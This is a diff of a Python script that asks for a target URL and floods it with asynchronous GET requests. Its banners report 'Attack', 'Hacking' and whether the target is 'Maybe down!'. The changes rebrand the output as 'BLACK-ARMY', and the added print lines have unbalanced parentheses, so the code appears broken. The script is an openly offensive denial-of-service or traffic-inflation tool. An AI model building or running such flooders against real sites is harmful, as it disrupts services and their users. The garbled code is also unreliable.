@@ -43,6 +43,7 @@ logo = """
 faded_text = fade.fire(logo)
 print(faded_text)
 ask = fade.pinkred("\033[33m==⟩⟩MASUKAN TARGET URL: \033[0m")
+print("\033[31m________________________\033[0m")
 url = input(ask)
 print("\033[96mMOHON BERSABAR KARENA INI BUKAN UJIAN..! 🤭\033[0m")
 
@@ -50,11 +51,13 @@ async def increment_view_count(session):
     try:
         async with session.get(url) as response:
             if response.status == 200:
-                print("\033[95m[💥] \033[96mHUDAIRUL-AQSHA \033[97m Attack \033[33m" +str(url)+ "  \033[31mHacking\033[0m")
+                print(("\033[32m[÷]\033[31m▒▒\033[92m▒▒BLACK-ARMY\033[33m▒▒REQUEST\033[33m▒▒SENT\033[37m▒▒\033[93m" +str(url)+ "\033[31m▒▒::")
             else:
-                print("\033[33m[*] \033[33mHUDAIRUL-AQSHA \033[36m Attack  \033[35m" +str(url)+ "  \033[93mHacking\033[0m")
+                print(("\033[37m[÷]\033[31m▒▒\033[97m▒▒BLACK-ARMY\033[34m▒▒REQUEST\033[31m▒▒SENT\033[37m▒▒\033[35m" +str(url)+ "\033[31m▒▒::")
+            
     except aiohttp.ClientError as e:
-            print("\033[31m[!] \033[32mHUDAIRUL-AQSHA \033[31m Attack  \033[33m" +str(url)+ "  \033[37mMaybe down!\033[0m")
+                print(("\033[33m[÷]\033[31m▒▒\033[94m▒▒BLACK-ARMY\033[96m▒▒Target\033[31m▒▒Maybe\033[37m▒▒\033[35m\033[31m▒▒down!\033[37m▒▒::")
+            
 
 async def main():
     connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
